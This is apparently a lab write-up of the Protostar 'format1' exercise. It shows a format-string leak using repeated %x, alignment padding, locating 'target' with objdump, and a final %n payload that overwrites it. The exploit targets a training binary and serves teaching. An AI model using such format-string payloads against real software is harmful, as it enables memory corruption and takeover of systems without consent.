#Format 1

Goal: To overwrite target with some value. It can be anything since there is no condition for checking specific value.

It took me some time to figure the value is around 166-167. 

```
[01:19:20] danny@ubuntu:~/Desktop/project/Exploit-Exercises/Protostar/format1$./format1 AAAA$(python -c 'print "%x." * 167')%x
AAAA2f.804a000.80484e2.2.ffffcf84.ffffcee8.804848e.ffffd151.f7ffd000.804849b.f7fbd000.8048490.0.0.f7e2fa63.2.ffffcf84.ffffcf90.f7feacea.2.ffffcf84.ffffcf24.804a018.804822c.f7fbd000.0.0.0.80827cf4.baebd8e4.0.0.0.2.8048350.0.f7ff0500.f7e2f979.f7ffd000.2.8048350.0.8048371.8048475.2.ffffcf84.8048490.8048500.f7feb180.ffffcf7c.1c.2.ffffd147.ffffd151.0.ffffd34d.ffffd358.ffffd36a.ffffd380.ffffd391.ffffd3c2.ffffd3d1.ffffd406.ffffd411.ffffd421.ffffd438.ffffd449.ffffd45b.ffffd49f.ffffd4d3.ffffd502.ffffd50d.ffffda2e.ffffda68.ffffda9c.ffffdacc.ffffdb1e.ffffdb51.ffffdb95.ffffdbf3.ffffdc0a.ffffdc1c.ffffdc3d.ffffdc46.ffffdc8a.ffffdc9e.ffffdcb5.ffffdcc6.ffffdcd5.ffffdd0b.ffffdd1d.ffffdd3a.ffffdd4c.ffffdd66.ffffdd75.ffffdd86.ffffdd8e.ffffdd9d.ffffddc9.ffffddd7.ffffddf1.ffffde40.ffffde52.ffffde8e.ffffdeae.ffffdeb8.ffffdecd.ffffdeec.ffffdef7.ffffdf11.ffffdf24.ffffdf46.ffffdf67.ffffdf80.ffffdfa3.ffffdfe2.0.20.f7fd9d60.21.f7fd9000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.9.7.f7fdc000.8.0.9.8048350.b.3e8.c.3e8.d.3e8.e.3e8.17.0.19.ffffd12b.1f.ffffdfee.f.ffffd13b.0.0.f1000000.ce983ad6.d385bf8f.1347187c.69e92c83.363836.0.2e000000.726f662f.3174616d.41414100
```
But then as you can see, it seems like it is off by a byte.To mitigate this, you can add padding.

```
AAAC2f.804a000.80484e2.2.ffffcf84.ffffcee8.804848e.ffffd150.f7ffd000.804849b.f7fbd000.8048490.0.0.f7e2fa63.2.ffffcf84.ffffcf90.f7feacea.2.ffffcf84.ffffcf24.804a018.804822c.f7fbd000.0.0.0.5aaa499b.60c3ed8b.0.0.0.2.8048350.0.f7ff0500.f7e2f979.f7ffd000.2.8048350.0.8048371.8048475.2.ffffcf84.8048490.8048500.f7feb180.ffffcf7c.1c.2.ffffd146.ffffd150.0.ffffd34d.ffffd358.ffffd36a.ffffd380.ffffd391.ffffd3c2.ffffd3d1.ffffd406.ffffd411.ffffd421.ffffd438.ffffd449.ffffd45b.ffffd49f.ffffd4d3.ffffd502.ffffd50d.ffffda2e.ffffda68.ffffda9c.ffffdacc.ffffdb1e.ffffdb51.ffffdb95.ffffdbf3.ffffdc0a.ffffdc1c.ffffdc3d.ffffdc46.ffffdc8a.ffffdc9e.ffffdcb5.ffffdcc6.ffffdcd5.ffffdd0b.ffffdd1d.ffffdd3a.ffffdd4c.ffffdd66.ffffdd75.ffffdd86.ffffdd8e.ffffdd9d.ffffddc9.ffffddd7.ffffddf1.ffffde40.ffffde52.ffffde8e.ffffdeae.ffffdeb8.ffffdecd.ffffdeec.ffffdef7.ffffdf11.ffffdf24.ffffdf46.ffffdf67.ffffdf80.ffffdfa3.ffffdfe2.0.20.f7fd9d60.21.f7fd9000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.9.7.f7fdc000.8.0.9.8048350.b.3e8.c.3e8.d.3e8.e.3e8.17.0.19.ffffd12b.1f.ffffdfee.f.ffffd13b.0.0.8b000000.d46bc267.fb32529b.fc6bbc12.6975051e.363836.0.2f2e0000.6d726f66.317461.41414141
```
That looks better than before. Now get the target address and overwrite it with any value you like!

```
[01:22:32] danny@ubuntu:~/Desktop/project/Exploit-Exercises/Protostar/format1$objdump -t format1 | grep "target"
0804a028 g     O .bss	00000004              target
```
Final payload

```
[01:27:22] danny@ubuntu:~/Desktop/project/Exploit-Exercises/Protostar/format1$./format1 $(python -c 'print "\x28\xa0\x04\x08" + "C" + "%x." * 167 + "%n"')
```



